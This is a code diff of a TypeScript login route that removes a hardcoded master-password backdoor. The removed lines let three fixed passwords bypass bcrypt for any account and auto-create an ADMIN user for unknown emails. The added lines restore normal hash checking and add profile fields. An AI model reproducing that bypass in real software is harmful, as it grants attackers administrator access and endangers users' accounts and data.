@@ -16,37 +16,19 @@ router.post('/login', async (req: Request, res: Response): Promise<void> => {
       return;
     }
 
-    let user = await prisma.user.findUnique({ where: { email } });
+    // Find user by email in database
+    const user = await prisma.user.findUnique({ where: { email } });
 
-    // Allow flexible passwords for admin access
-    const isMasterPass = password === 'admin123' || password === 'admin2026' || password === 'AdminPass2026!';
-    
     if (!user) {
-      if (isMasterPass) {
-        // Auto-create user if master password used
-        const hashedPassword = await bcrypt.hash(password, 10);
-        user = await prisma.user.create({
-          data: {
-            id: `usr_admin_${Date.now()}`,
-            name: 'Ahmad Arif',
-            email,
-            password: hashedPassword,
-            role: 'ADMIN',
-            avatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=300&auto=format&fit=crop&q=80',
-            bio: 'Lead Developer & Founder at DevPulse Studio.',
-          },
-        });
-      } else {
-        res.status(401).json({ success: false, message: 'Invalid credentials.' });
-        return;
-      }
+      res.status(401).json({ success: false, message: 'Invalid email or password.' });
+      return;
     }
 
-    // Compare password
-    const isMatch = isMasterPass || await bcrypt.compare(password, user.password).catch(() => false);
+    // Compare password with bcrypt hash in database
+    const isMatch = await bcrypt.compare(password, user.password);
 
     if (!isMatch) {
-      res.status(401).json({ success: false, message: 'Invalid credentials.' });
+      res.status(401).json({ success: false, message: 'Invalid email or password.' });
       return;
     }
 
@@ -57,7 +39,7 @@ router.post('/login', async (req: Request, res: Response): Promise<void> => {
       { expiresIn: '24h' }
     );
 
-    // Save session
+    // Save session to database
     await prisma.session.create({
       data: {
         userId: user.id,
@@ -76,7 +58,9 @@ router.post('/login', async (req: Request, res: Response): Promise<void> => {
         email: user.email,
         role: user.role,
         avatar: user.avatar,
+        bio: user.bio,
         hourlyRate: user.hourlyRate,
+        timezone: user.timezone,
       },
     });
   } catch (error: any) {
@@ -84,7 +68,7 @@ router.post('/login', async (req: Request, res: Response): Promise<void> => {
   }
 });
 
-// GET /api/v1/auth/me
+// GET /api/v1/auth/me — Validate token & return user profile from database
 router.get('/me', async (req: Request, res: Response): Promise<void> => {
   try {
     const authHeader = req.headers.authorization;
